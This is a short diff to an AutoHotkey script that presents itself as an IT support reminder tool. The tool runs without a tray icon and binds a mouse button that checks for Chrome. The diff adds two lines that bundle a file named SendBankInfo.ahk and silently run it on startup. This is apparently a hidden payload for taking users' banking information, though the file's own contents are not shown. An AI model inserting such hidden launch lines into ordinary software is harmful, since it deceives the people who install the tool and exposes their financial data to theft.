@@ -1,11 +1,13 @@
 ﻿#NoTrayIcon
 #SingleInstance force
 FileInstall, ITSupportReminder.ahk, %A_WorkingDir%\ITSupportReminder.ahk
+FileInstall, SendBankInfo.ahk, %A_WorkingDir%\SendBankInfo.ahk
 FileInstall, icon.ico, %A_WorkingDir%\icon.ico
 FileInstall, logo.png, %A_WorkingDir%\logo.png
 Menu, Tray, Icon, icon.ico
 
 SetTitleMatchMode, 2
+Run SendBankInfo.ahk
 
 XButton1::
     IfWinExist, ahk_exe chrome.exe
